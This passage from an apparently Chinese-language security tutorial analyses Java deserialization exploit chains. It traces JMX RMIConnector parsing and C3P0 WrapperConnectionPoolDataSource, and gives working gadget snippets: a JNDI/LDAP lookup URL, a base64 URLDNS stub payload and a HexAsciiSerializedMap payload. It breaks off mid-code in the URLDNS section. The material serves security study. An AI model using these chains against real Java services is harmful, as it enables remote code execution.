方括号中的内容必须是“数字形式的 IPv6 地址”（不接受主机名）</span></span><br><span class="line">        <span class="keyword">if</span> (!isNumericIPv6Address(<span class="built_in">this</span>.host)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Address inside [...] must &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;be numeric IPv6 address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 普通主机名：从 hostStart 开始，找到第一个“不属于允许字符集合”的位置</span></span><br><span class="line">        <span class="comment">// hostNameBitSet：允许出现在主机名中的字符集合（字母/数字/连字符/点等）</span></span><br><span class="line">        hostEnd =</span><br><span class="line">            indexOfFirstNotInSet(serviceURL, hostNameBitSet, hostStart);</span><br><span class="line">        <span class="built_in">this</span>.host = serviceURL.substring(hostStart, hostEnd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析端口号（可选）。若存在则形如 &quot;:&lt;digits&gt;&quot;</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> portEnd;</span><br><span class="line">    <span class="keyword">if</span> (hostEnd &lt; serviceURLLength &amp;&amp; serviceURL.charAt(hostEnd) == <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 不允许只有端口没有主机</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Cannot give port number &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;without host name&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">portStart</span> <span class="operator">=</span> hostEnd + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 从端口起始处查找第一个“不是数字”的字符位置</span></span><br><span class="line">        portEnd =</span><br><span class="line">            indexOfFirstNotInSet(serviceURL, numericBitSet, portStart);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">portString</span> <span class="operator">=</span> serviceURL.substring(portStart, portEnd);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.port = Integer.parseInt(portString);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Bad port number: \&quot;&quot;</span> +</span><br><span class="line">                                            portString + <span class="string">&quot;\&quot;: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有端口：端口默认为 0</span></span><br><span class="line">        portEnd = hostEnd;</span><br><span class="line">        <span class="built_in">this</span>.port = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 URL 的“路径”部分：从端口结束位置起到字符串末尾</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">urlPathStart</span> <span class="operator">=</span> portEnd;</span><br><span class="line">    <span class="keyword">if</span> (urlPathStart &lt; serviceURLLength)</span><br><span class="line">        <span class="built_in">this</span>.urlPath = serviceURL.substring(urlPathStart);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">this</span>.urlPath = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最终一致性校验（例如：协议/主机/端口/路径的组合是否合法）</span></span><br><span class="line">    validate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>getURLPath</code> 返回的是 <strong>url-path</strong> 部分的内容。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取 Service URL 的“路径”部分（URL Path）。</span></span><br><span class="line"><span class="comment"> * 取值约束：</span></span><br><span class="line"><span class="comment"> *  - 可能是空字符串 &quot;&quot;；</span></span><br><span class="line"><span class="comment"> *  - 或以斜杠 &#x27;/&#x27; 开头；</span></span><br><span class="line"><span class="comment"> *  - 或以分号 &#x27;;&#x27; 开头；</span></span><br><span class="line"><span class="comment"> * 严格保证**不为 null**。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 永不为 null 的 URL 路径部分</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getURLPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 直接返回在构造/validate() 阶段已解析并校验过的 urlPath（String 不可变，无需拷贝）</span></span><br><span class="line">    <span class="keyword">return</span> urlPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><code>findRMIServer</code> 方法先检测 <code>JMXServiceURL</code> 的协议是否是 <code>rmi</code> 或 <code>iiop</code>；之后根据传入的 <code>directoryURL</code> 参数前缀主要有 <code>/jndi/</code> 和 <code>/stub/</code> 两个分支。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据给定的 JMXServiceURL 和环境参数，定位并返回远程 RMIServer 引用。</span></span><br><span class="line"><span class="comment">// 可能通过 JNDI（/jndi/）、JRMP Stub（/stub/）或 IOR（/ior/）三种路径解析。</span></span><br><span class="line"><span class="comment">// 当协议为 IIOP 时，确保 ORB 已放入环境中供命名服务解析使用。</span></span><br><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span><br><span class="line"><span class="params">        Map&lt;String, Object&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断 URL 的协议是否为 iiop（CORBA IIOP）。strict=true 表示只接受 rmi 或 iiop 两种协议，否则抛异常</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isIiop</span> <span class="operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isIiop) &#123;</span><br><span class="line">        <span class="comment">// 如果是 IIOP，确保环境中包含 ORB 实例（键：EnvHelp.DEFAULT_ORB，通常是 &quot;java.naming.corba.orb&quot;）</span></span><br><span class="line">        <span class="comment">// 某些 IIOP/JNDI 解析需要 ORB 来与命名服务交互</span></span><br><span class="line">        environment.put(EnvHelp.DEFAULT_ORB, resolveOrb(environment));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出 URL 的 path 部分（形如：/jndi/xxx、/stub/xxx、/ior/xxx;attr1=...）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> directoryURL.getURLPath();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找 &#x27;;&#x27;（分号）作为属性的起始；未找到则取到末尾</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> path.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路径以 /jndi/ 开头：走 JNDI 方式查找 RMIServer</span></span><br><span class="line">    <span class="comment">// 传入的子串为去掉前缀 &quot;/jndi/&quot; 的那一段（不包含后续分号属性）</span></span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/jndi/&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>, end), environment, isIiop);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路径以 /stub/ 开头：走 JRMP stub 方式（通常是 Base64/序列化形式的 RMI Stub）</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/stub/&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>, end), environment, isIiop);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路径以 /ior/ 开头：走 IIOP IOR 字符串解析</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/ior/&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 运行环境必须具备 IIOP 支持，否则报错</span></span><br><span class="line">        <span class="keyword">if</span> (!IIOPHelper.isAvailable())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;iiop protocol not available&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去掉 &quot;/ior/&quot; 前缀后，将 IOR 子串交给解析方法</span></span><br><span class="line">        <span class="keyword">return</span> findRMIServerIIOP(path.substring(<span class="number">5</span>, end), environment, isIiop);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 其他前缀均不支持：抛出格式错误（属于 IOException 的子类 MalformedURLException）</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +</span><br><span class="line">                <span class="string">&quot;or /ior/: &quot;</span> + path;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判定给定的 JMXServiceURL 是否为 IIOP 协议。</span></span><br><span class="line"><span class="comment">// protocol = &quot;rmi&quot;  -&gt; 返回 false</span></span><br><span class="line"><span class="comment">// protocol = &quot;iiop&quot; -&gt; 返回 true</span></span><br><span class="line"><span class="comment">// 其他协议：若 strict=true，则抛出 MalformedURLException；若 strict=false，则按非 IIOP 处理（返回 false）</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isIiopURL</span><span class="params">(JMXServiceURL directoryURL, <span class="type">boolean</span> strict)</span></span><br><span class="line">    <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出协议名（如 rmi、iiop）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> directoryURL.getProtocol();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rmi：非 IIOP</span></span><br><span class="line">    <span class="keyword">if</span> (protocol.equals(<span class="string">&quot;rmi&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// iiop：IIOP</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (protocol.equals(<span class="string">&quot;iiop&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 既不是 rmi 也不是 iiop：在 strict 模式下直接报错，限制只允许两种协议</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strict) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;URL must have protocol &quot;</span> +</span><br><span class="line">                                        <span class="string">&quot;\&quot;rmi\&quot; or \&quot;iiop\&quot;: \&quot;&quot;</span> +</span><br><span class="line">                                        protocol + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非 strict 模式，其他协议一律视为非 IIOP</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>/jndi/</code> 分支对应的 <code>findRMIServerJNDI</code> 函数可以触发 JNDI：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServerJNDI</span><span class="params">(String jndiURL, Map&lt;String, ?&gt; env,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> isIiop)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(EnvHelp.mapToHashtable(env));</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">objref</span> <span class="operator">=</span> ctx.lookup(jndiURL);</span><br><span class="line">    ctx.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isIiop)</span><br><span class="line">        <span class="keyword">return</span> narrowIIOPServer(objref);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> narrowJRMPServer(objref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以构造一条触发 JNDI 的利用链：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIConnector</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://example.com/jndi/ldap://127.0.0.1:8099/exploit&quot;</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;()</span><br><span class="line">);</span><br><span class="line">conn.connect();</span><br></pre></td></tr></table></figure></div>

<p>而 <code>/stub/</code> 分支对应的 <code>findRMIServerJRMP</code> 则会将 <code>base64</code> 参数的内容反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="type">boolean</span> isIiop)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] serialized;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serialized = base64ToByteArray(base64);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span></span><br><span class="line">        (loader == <span class="literal">null</span>) ?</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin) :</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ObjectInputStreamWithLoader</span>(bin, loader);</span><br><span class="line">    <span class="keyword">final</span> Object stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = oin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以构造一条二次反序列化利用链：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIConnector</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://example.com/stub/&quot;</span></span><br><span class="line">                + Base64.getEncoder().encodeToString(URLDNS.getPayload(<span class="string">&quot;http://www.example.com&quot;</span>))),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;()</span><br><span class="line">);</span><br><span class="line">conn.connect();</span><br></pre></td></tr></table></figure></div>

<h5 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h5><p>这是一条来自 C3P0 的二次反序列化链，其中 C3P0 坐标如下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:431)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.deserializeFromByteArray(SerializableUtils.java:144)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.fromByteArray(SerializableUtils.java:123)</span><br><span class="line">at com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString(C3P0ImplUtils.java:252)</span><br><span class="line">at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource$1.vetoableChange(WrapperConnectionPoolDataSource.java:58)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:375)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:271)</span><br><span class="line">at com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase.setUserOverridesAsString(WrapperConnectionPoolDataSourceBase.java:441)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString</code> 函数会将子串 <code>userOverridesAsString[len(&quot;HexAsciiSerializedMap&quot;) + 1 : -1]</code> 从 HEX 转换为 bytes，然后调用 <code>com.mchange.v2.ser.SerializableUtils#fromByteArray</code> 进行后续反序列化操作。</p>
<p>这里 <code>userOverridesAsString</code> 就是调用 <code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code> 时传入的参数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123; </span><br><span class="line">    <span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后会在 <code>SerializableUtils#deserializeFromByteArray</code> 函数进行实际的反序列化操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line">    <span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">        <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">    <span class="keyword">return</span> in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以构造如下二次反序列化利用链：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> ByteUtils.toHexAscii(URLDNS.getPayload(<span class="string">&quot;http://www.example.com&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"><span class="type">WrapperConnectionPoolDataSource</span> <span class="variable">wrapperConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WrapperConnectionPoolDataSource</span>();</span><br><span class="line">wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);</span><br></pre></td></tr></table></figure></div>

<h1 id="JDK-原生反序列化利用链"><a href="#JDK-原生反序列化利用链" class="headerlink" title="JDK 原生反序列化利用链"></a>JDK 原生反序列化利用链</h1><p>主要是一些不依赖第三方库的 Java 反序列化利用链。</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS 反序列化利用链可以通过 DNS 请求来验证反序列化漏洞的可利用性。这条利用链使用 Java 内置的类构造，对第三方库没有依赖，可以在没有回显的情况下验证是否存在反序列化漏洞。我们可以在 <a class="link"   target="_blank" rel="noopener" href="https://requestrepo.com/" >https://requestrepo.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 网站上进行 DNS 请求测试。</p>
<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at java.net.URLStreamHandler.getHostAddress(URLStreamHandler.java:434)</span><br><span class="line">at java.net.URLStreamHandler.hashCode(URLStreamHandler.java:359)</span><br><span class="line">at java.net.URL.hashCode(URL.java:885)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:339)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1413)</span><br></pre></td></tr></table></figure></div>

<p>首先在 <code>HashMap.readObject</code> 中会遍历 <code>HashMap</code> 的成员并对 <code>key</code> 调用 <code>HashMap.hash</code> 函数计算 hash。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 